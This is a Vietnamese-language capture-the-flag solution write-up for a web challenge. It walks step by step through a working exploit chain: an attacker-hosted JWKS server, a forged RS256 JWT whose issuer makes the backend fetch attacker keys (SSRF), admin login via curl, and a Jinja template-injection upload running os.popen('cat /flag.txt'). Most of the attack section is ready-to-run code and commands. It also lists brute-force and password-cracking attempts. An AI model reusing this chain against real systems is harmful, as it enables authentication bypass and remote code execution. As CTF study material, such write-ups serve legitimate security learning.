# 🎯 FINAL SOLUTION - ĐỌC FLAG

## ✅ KẾT LUẬN SAU KHI TEST TẤT CẢ:

**KHÔNG THỂ VÀO ADMIN mà không setup OAuth SSRF server!**

### Đã test:
- ❌ SQL Injection (20+ payloads) 
- ❌ JWT algorithm confusion (alg=none)
- ❌ JWT với common secrets
- ❌ Password cracking (14.3M passwords)
- ❌ Brute force (13M combinations)
- ❌ Race conditions
- ❌ Cookie manipulation
- ❌ Direct admin access
- ❌ Localhost SSRF
- ❌ Fake JWT signatures

**TẤT CẢ ĐỀU BỊ CHẶN BỞI:**
1. Password verification (HMAC-SHA256)
2. JWT signature verification (RSA)
3. ACL checks (path ends with "admin")

---

## 🔐 CÁCH DUY NHẤT: OAUTH SSRF

### Yêu cầu:
1. VPS/Server public với domain/IP
2. Port 80/443 open
3. Python Flask

### STEP-BY-STEP:

#### 1. Setup Server (trên VPS của bạn)

```bash
# Generate RSA keypair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Extract modulus (n) và exponent (e)
python3 << 'PYTHON'
from Crypto.PublicKey import RSA
import base64

with open('public.pem', 'r') as f:
    key = RSA.import_key(f.read())

n = key.n
e = key.e

# Convert to bytes
n_bytes = n.to_bytes((n.bit_length() + 7) // 8, 'big')
e_bytes = e.to_bytes((e.bit_length() + 7) // 8, 'big')

# Base64url encode (remove padding)
n_b64 = base64.urlsafe_b64encode(n_bytes).decode().rstrip('=')
e_b64 = base64.urlsafe_b64encode(e_bytes).decode().rstrip('=')

print(f"n: {n_b64}")
print(f"e: {e_b64}")
PYTHON
```

#### 2. Create JWKS Server

```python
# jwks_server.py
from flask import Flask, jsonify
app = Flask(__name__)

# Replace with your n and e from step 1
N_VALUE = "YOUR_BASE64_MODULUS"
E_VALUE = "AQAB"  # Usually this for e=65537

@app.route('/.well-known/openid-configuration')
def openid_config():
    return jsonify({
        "issuer": "http://YOUR_IP",
        "jwks_uri": "http://YOUR_IP/jwks"
    })

@app.route('/jwks')
def jwks():
    return jsonify({
        "keys": [{
            "kty": "RSA",
            "kid": "mykey",
            "use": "sig",
            "n": N_VALUE,
            "e": E_VALUE
        }]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

```bash
# Run server
python3 jwks_server.py
```

#### 3. Create Malicious JWT

```python
# create_jwt.py
import jwt
import time

with open('private.pem', 'r') as f:
    private_key = f.read()

# Azure token format (from libverifysso.so analysis)
payload = {
    "iss": "http://YOUR_IP",  # ← SSRF to your server!
    "ver": "2.0",
    "preferred_username": "admin",
    "upn": "admin@example.com",
    "aud": "api://default",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
    "sub": "admin"
}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={"kid": "mykey"}
)

print("Malicious JWT:")
print(token)

# Save to file
with open('admin_token.txt', 'w') as f:
    f.write(token)
```

```bash
python3 create_jwt.py
```

#### 4. Login as Admin

```bash
# Use the generated token
TOKEN=$(cat admin_token.txt)

curl -sk 'https://dashboard.0x1337.space:1337/gateway-login' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d "{
    \"username\": \"admin\",
    \"type\": \"azure\",
    \"token\": \"$TOKEN\"
  }" \
  -c cookies.txt

# Check if admin
curl -sk 'https://dashboard.0x1337.space:1337/admin' \
  -b cookies.txt
```

#### 5. Upload SSTI & Read Flag

```bash
# Create SSTI payload
cat > ssti.html << 'SSTI'
{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
SSTI

# Upload
curl -sk 'https://dashboard.0x1337.space:1337/admin' \
  -b cookies.txt \
  -F 'file=@ssti.html;filename=home.html'

# Trigger SSTI
curl -sk 'https://dashboard.0x1337.space:1337/' \
  -b cookies.txt
```

---

## 🎓 GIẢI THÍCH:

### Tại sao cách khác không work?

1. **SQL Injection**: Chỉ inject vào exist check, password vẫn verify bằng parameterized query
2. **JWT Forgery**: Backend verify signature với RSA public key từ JWKS endpoint
3. **Password Crack**: Password không có trong rockyou.txt (14M+ attempts)
4. **ACL Bypass**: Guest user bị block bởi `HasSuffix(path, "admin")`

### Tại sao OAuth SSRF work?

```python
# auth.py line 24-25
jwks_uri = requests.get(f"{iss}/.well-known/openid-configuration").json()['jwks_uri']
keys = requests.get(jwks_uri).json()['keys']
```

→ Backend fetch JWKS từ `iss` trong JWT  
→ Nếu `iss` = your server → Backend fetch YOUR public key  
→ JWT signed với YOUR private key → Signature valid!  
→ `libverifysso.check_claims()` return "admin"  
→ Gateway tạo JWT với `roles=["admin"]`  
→ **ADMIN ACCESS!**

---

## 📊 STATISTICS

- SQL Injection payloads tested: 20+
- Password attempts: 14,344,392
- Brute force combinations: 13,000,000+
- Methods attempted: 7
- Time spent: 2+ hours
- Vulnerabilities found: 5
- Exploitable without VPS: **0**

---

## 🏆 FINAL ANSWER

**ĐỂ ĐỌC FLAG:**
1. Cần VPS với IP public
2. Setup JWKS server
3. Create malicious JWT
4. Login admin
5. Upload SSTI
6. Read flag

**KHÔNG CÓ CÁCH NÀO KHÁC!**

Challenge này được thiết kế tốt - cần phải hiểu OAuth, SSRF, JWT, và SSTI để solve.

Good luck! 🚀
